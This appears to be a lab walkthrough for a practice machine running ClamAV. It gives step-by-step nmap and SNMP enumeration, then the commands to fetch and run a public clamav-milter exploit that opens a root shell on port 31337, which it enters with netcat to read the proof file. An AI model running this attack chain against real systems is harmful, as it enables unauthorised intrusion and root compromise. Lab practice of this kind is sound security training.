Foothold

Foothold

1. Scan for open TCP ports
`sudo nmap -p- 192.168.132.42`
![e74dc89cbae7b2900c528c6d368d9aea.png](../../../../_resources/4f7990b15ebe4cc090486f634329fe98.png)


2. Run service detection on the open TCP ports
`sudo nmap -p22,25,80,139,199,445,60000 -sV 192.168.132.42`
![77cc8736dcfff8c479cdae83d0a840c4.png](../../../../_resources/f3d12a06a87b403bbe1a5c98035f95b4.png)


3. Scan for open UDP ports
`sudo nmap -sU -p- --defeat-icmp-ratelimit 192.168.132.42`
![77bb9f438ccb284aa973c6a4782fe67a.png](../../../../_resources/484c9d70fd854f3f8db0781f956af5a3.png)


4. Run service detection on open UDP ports
`sudo nmap -sU -p137,161 -sV 192.168.132.42`
![d9c1e19112fbec8f641dc7e5cd88ca0f.png](../../../../_resources/840862dfb08b401d8f81481bec627447.png)


5. Run aggressive scan on open UPD ports
`sudo nmap -sU -p137,161 -A 192.168.132.42`
![e439d2b44a8d6d69aa22dbbc59477dcf.png](../../../../_resources/de00f45383be4156b74d1f38ccb64e41.png)
![decdff579eae216c115d3d2619845c52.png](../../../../_resources/3f28c255a9ae4dbab6a75da4abbf209a.png)
![87865ac78b849d8a2e2d3bc111bdf0f3.png](../../../../_resources/6312edc443c242daa335ea07f1a851e0.png)
![7d5167b1f534c3c81dca088afa81446e.png](../../../../_resources/7b2e37e8b2544188896e9933f6b12c3c.png)
![b86fd19750bf7fdfcf561eb48a602ede.png](../../../../_resources/320349ef5f304dc08b630091b796e9b6.png)

**At this point, we could go straight to a Google search for ClamAV Black Hole instead of continuing to enumerate snmp.**


6. Run the safe, default, auth and vuln scripts on open UDP ports.
`sudo nmap -sU -p137,161 --script default,safe,auth,vuln 192.168.132.42`
![6cfa73c641c568d6c31b009ff1c9c424.png](../../../../_resources/d73a15ecf8a441e88a8faff19281be68.png)
![e046ea0c1bfa71fa97b63a58c2297474.png](../../../../_resources/4183c74c45394fdfab8d3b908d3649db.png)
![e993ce5d0516864120db2cf8a5e3b07c.png](../../../../_resources/38ffa0bf5c5a4c6d85f82c92aca421ab.png)
![57b6365a1d4c169f7cb470ca7376ccfd.png](../../../../_resources/3460cc8cd2e9432a934453f358931e71.png)
![145a92c1c111dd9d2dc672e4b50f5b78.png](../../../../_resources/5b9d12d1957e4f52a50873059b9b9a78.png)
![dfb19da9c6934b039625ec74ee82414c.png](../../../../_resources/a248dbbef41e4da5a9b3e33d91aa17a6.png)


7. Run any and all snmp-related NSE scripts on UDP port 161
`sudo nmap -sU -p161 --script "snmp*" 192.168.132.42`


8. Enumerate UDP port 161 snmp with snmp-check
`snmp-check 192.168.132.42 -c public`
![5987ed5a1705d899725fdfff393ab3c0.png](../../../../_resources/954f9751fed945ccb01e6c4c901601c6.png)
![c65dfcaf34b9b0d6d31ea75a30a354d4.png](../../../../_resources/06d5edabe66143aebf82a677d593342e.png)
![0e73b69f91e5efe82f9461ebfd8433db.png](../../../../_resources/361d4f3c9c7f4976b21cf3371af558cf.png)
![cd166fb1e1591b7bc1f901e4b554f524.png](../../../../_resources/01d52fe7a2b14c29893180b77356f81a.png)
![b7c32ee1e467c7016ed2fa57efab0281.png](../../../../_resources/ce542cb103394172b3e5adfe7c3324c2.png)
![1a124ab06688d56700eb5ac45aa7ed75.png](../../../../_resources/50ae9dad962347659e8c090614536571.png)


9. Enumerate using onesixtyone
`echo public > community`
`echo private >> community`
`echo manager >> community`
`onesixtyone -c community -i ips`
![f05a3344da9f2b941198d1de20d0f40a.png](../../../../_resources/c6d615ad81da497e9341e2920c58617f.png)


10. Enumerate using snmpwalk
`snmpwalk -c public -v 1 -t 10 192.168.132.42`
![e23f0556b9d1f28482f1e2cae632c836.png](../../../../_resources/07ffc6ff1ca644bbb9360cf5fd2a1ef5.png)
![931182cb618717626f1b9fda6946f7b4.png](../../../../_resources/3530bcbcc1bd40d4afffdfb8ab276057.png)
![0634764d7ac8e5ad06b9cdf4881e6134.png](../../../../_resources/b1174d8143584c5ebdc0053c10a5d4dd.png)
![6e617694b39c246ccf704ac67e1a31ab.png](../../../../_resources/389c3ae0238b4725add0f5f3e13d3564.png)
![c2d89ea63839a0c90d39099f57749e6f.png](../../../../_resources/1810e60c143d4b089ad8c34d1184499e.png)
![3f4fd7dfeccebcc8c569ed7064a4ba5f.png](../../../../_resources/7479831b90564532ab95e1bbc679b5fa.png)
![a26efa7aaa42456c9324ae244e134454.png](../../../../_resources/4cbfcc8ba3c04aa8915c57e354580ebd.png)
![8e5ac338ee4b3ca55eb27a1b9a51b2e6.png](../../../../_resources/bc0d732cab0840678e3c7280eac4db7a.png)
![8eabc2685e50ddcc28a17ddc2df7e9a5.png](../../../../_resources/c6c7259541264c7e8d28a0f9cd759879.png)
![af14d3e7f87e28ff4b5e9472c39cd1d9.png](../../../../_resources/55637aa30eb641849759bbbcc10ca592.png)


11. searchsploit clamav-milter
`searchsploit clamav-milter`
![712f27de126738c30d53066fbd811cbb.png](../../../../_resources/ef96bc1b341a4916a94145bf0e7edc9f.png)


12. Download 4761.pl
`searchsploit -m 4761`


13. Run 4761.pl. It should open port 31337
`perl 4761.pl 192.168.132.42`
![f0798fe87e54f83bea4be64c9cf0c2db.png](../../../../_resources/d79003fd49c44395b32a36ae1ff60006.png)


14. Check if port 31337 is open via Nmap. It is.
`sudo nmap -p31337 192.168.132.42`
![8bacba83433ebd75923eb58e51513299.png](../../../../_resources/1eb4bc66a8d54c74a2c3d565c981ec06.png)


15. Netcat into port 31337
`nc -nv 192.168.132.42 31337`
`whoami`
`cat /root/proof.txt`
`ifconfig`
![11df413e40a694c907d7b9110177d64f.png](../../../../_resources/5c1b571328954b5785367c90fc51a0af.png)




































